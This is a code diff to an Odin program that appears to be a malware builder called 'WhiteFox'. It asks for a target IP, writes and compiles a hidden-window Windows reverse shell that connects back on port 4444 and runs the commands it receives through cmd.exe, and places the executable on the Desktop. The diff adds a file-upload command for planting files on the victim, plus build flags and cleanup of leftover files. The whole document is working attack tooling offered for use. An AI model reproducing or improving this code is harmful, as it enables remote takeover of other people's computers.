@@ -4,25 +4,36 @@ import "core:os"
 import "core:os/os2"
 import "core:fmt"
 import "core:strings"
+import "core:path/filepath"
 
 main :: proc() {
-    drive := os.get_env("HOMEDRIVE")
-    path := os.get_env("HOMEPATH")
-    desktop_path := fmt.aprintf("%s%s\\Desktop\\payload.exe", drive, path)
+    // Logic to find the Desktop or current directory
+    home := os.get_env("USERPROFILE")
+    desktop_path: string
+    
+    if home != "" {
+        desktop_path = fmt.aprintf("%s\\Desktop\\payload.exe", home)
+    } else {
+        // Fallback: Create it in the same folder as this generator
+        desktop_path = "payload.exe"
+    }
 
-    // Using backticks throughout. Internal backticks are handled by joining.
-    fmt.println(`                                                                         
-$$\      $$\ $$\       $$\   $$\               $$$$$$$$\                  
-$$ | $\  $$ |$$ |      \__|  $$ |              $$  _____|                 
-$$ |$$$\ $$ |$$$$$$$\  $$\ $$$$$$\    $$$$$$\  $$ |    $$$$$$\  $$\   $$\ 
-$$ $$ $$\$$ |$$  __$$\ $$ |\_$$  _|  $$  __$$\ $$$$$\ $$  __$$\ \$$\ $$  |
-$$$$  _$$$$ |$$ |  $$ |$$ |  $$ |    $$$$$$$$ |$$  __|$$ /  $$ | \$$$$  / 
-$$$  / \$$$ |$$ |  $$ |$$ |  $$ |$$\ $$   ____|$$ |   $$ |  $$ | $$  $$<  
-$$  /   \$$ |$$ |  $$ |$$ |  \$$$$  |\$$$$$$$\ $$ |   \$$$$$$  |$$  /\$$\ 
-\__/     \__|\__|  \__|\__|   \____/  \_______|\__|    \______/ \__/  \__|
-                                                                          
-                                                                          
-                                                                                                                                                
+    fmt.println(` 
+                                                                             
+                                                                             
+____               ___ ___                         ________                    
+` + "`" + `Mb(      db      )d' ` + "`" + `MM      68b                 ` + "`" + `MMMMMMM                    
+ YM.     ,PM.     ,P   MM      Y89   /                 MM    \                    
+ ` + "`" + `Mb     d'Mb     d'   MM  __  ___  /M      ____    MM       _____  ____   ___ 
+  YM.   ,P YM.   ,P    MM 6MMb ` + "`" + `MM /MMMMM  6MMMMb   MM   ,  6MMMMMb ` + "`" + `MM(   )P' 
+  ` + "`" + `Mb   d' ` + "`" + `Mb   d'    MMM9 ` + "`" + `Mb MM  MM    6M'   ` + "`" + `Mb MMMMMM 6M'   ` + "`" + `Mb ` + "`" + `MM` + "`" + ` ,P   
+   YM. ,P   YM. ,P     MM'   MM MM  MM    MM    MM MM   ` + "`" + ` MM     MM  ` + "`" + `MM,P    
+   ` + "`" + `Mb d'   ` + "`" + `Mb d'     MM    MM MM  MM    MMMMMMMM MM     MM     MM   ` + "`" + `MM.    
+    YM,P     YM,P      MM    MM MM  MM    MM       MM     MM     MM   d` + "`" + `MM.   
+    ` + "`" + `MM'     ` + "`" + `MM'      MM    MM MM  YM.  ,YM    d9 MM     YM.   ,M9  d' ` + "`" + `MM.  
+     YP        YP      _MM_  _MM_MM_  YMMM9 YMMMM9 _MM_     YMMMMM9 _d_  _)MM_ 
+                                                                             
+                                                                             
 `)
 
     fmt.print("Enter target IP: ")
@@ -32,6 +43,7 @@ $$  /   \$$ |$$ |  $$ |$$ |  \$$$$  |\$$$$$$$\ $$ |   \$$$$$$  |$$  /\$$\
     
     payload_source := fmt.aprintf(`package main
 import "core:net"
+import "core:os"
 import "core:os/os2"
 import "core:strings"
 import "core:sys/windows"
@@ -39,7 +51,8 @@ import "core:fmt"
 
 main :: proc() {{
     endpoint, _ := net.parse_endpoint("%s:4444")
-    socket, _ := net.dial_tcp(endpoint)
+    socket, dial_err := net.dial_tcp(endpoint)
+    if dial_err != nil {{ return }}
     defer net.close(socket)
     
     for {{
@@ -47,15 +60,30 @@ main :: proc() {{
         bytes_read, _ := net.recv_tcp(socket, buffer[:])
         if bytes_read <= 0 {{ break }}
         
-        program := strings.trim_space(string(buffer[:bytes_read]))
-        if program == "exit" {{ break }}
+        input := strings.trim_space(string(buffer[:bytes_read]))
+        if input == "exit" {{ break }}
+
+        if strings.has_prefix(input, "transfer:") {{
+            file_path := strings.trim_prefix(input, "transfer:")
+            f, err := os.open(file_path, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0o666)
+            if err == nil {{
+                net.send_tcp(socket, transmute([]byte)string("[*] Ready for file data...\n"))
+                for {{
+                    n_file, _ := net.recv_tcp(socket, buffer[:])
+                    if n_file <= 0 || strings.contains(string(buffer[:n_file]), "EOF_DONE") {{ break }}
+                    os.write(f, buffer[:n_file])
+                }}
+                os.close(f)
+                net.send_tcp(socket, transmute([]byte)string("[+] Transfer complete.\n"))
+            }}
+            continue
+        }}
 
         h_read, h_write: windows.HANDLE
         sa := windows.SECURITY_ATTRIBUTES{{
             nLength = size_of(windows.SECURITY_ATTRIBUTES),
             bInheritHandle = true,
         }}
-        
         windows.CreatePipe(&h_read, &h_write, &sa, 0)
         windows.SetHandleInformation(h_read, windows.HANDLE_FLAG_INHERIT, 0)
 
@@ -68,26 +96,17 @@ main :: proc() {{
         }}
 
         pi: windows.PROCESS_INFORMATION
-        cmd_utf16 := windows.utf8_to_utf16(fmt.aprintf("cmd.exe /c %%s\x00", program))
+        cmd_utf16 := windows.utf8_to_utf16(fmt.aprintf("cmd.exe /c %%s\x00", input))
         
-        windows.CreateProcessW(
-            nil, 
-            cast(windows.wstring)raw_data(cmd_utf16), 
-            nil, nil, true, 
-            0x08000000, 
-            nil, nil, &si, &pi)
-
+        windows.CreateProcessW(nil, cast(windows.wstring)raw_data(cmd_utf16), nil, nil, true, 0x08000000, nil, nil, &si, &pi)
         windows.CloseHandle(h_write)
         
         for {{
             out_buf: [4096]byte
             n_read: u32
-            if !windows.ReadFile(h_read, raw_data(out_buf[:]), 4096, &n_read, nil) || n_read == 0 {{
-                break
-            }}
+            if !windows.ReadFile(h_read, raw_data(out_buf[:]), 4096, &n_read, nil) || n_read == 0 {{ break }}
             net.send_tcp(socket, out_buf[:n_read])
         }
-
         windows.WaitForSingleObject(pi.hProcess, windows.INFINITE)
         windows.CloseHandle(pi.hProcess)
         windows.CloseHandle(pi.hThread)
@@ -101,18 +120,24 @@ main :: proc() {{
         command = []string{
             "odin", "build", "payload.odin", "-file",
             fmt.aprintf("-out:%s", desktop_path),
-            "-o:speed", "-subsystem:windows",
+            "-o:speed",
+            "-target:windows_i386", 
+            "-subsystem:windows",
+            "-extra-linker-flags:/entry:mainCRTStartup", 
         },
         stdout = os2.stdout,
         stderr = os2.stderr,
     }
     
     p, _ := os2.process_start(compile_desc)
-    _ , _ = os2.process_wait(p)
+    _, _ = os2.process_wait(p)
     _ = os2.process_close(p)
     
     if os.exists(desktop_path) {
         fmt.printf("\n[+] Success! Payload created at: %s\n", desktop_path)
         os.remove("payload.odin")
+        if os.exists("payload.obj") { os.remove("payload.obj") }
+    } else {
+        fmt.println("\n[!] Error: Could not create EXE on Desktop. Check permissions.")
     }
 }
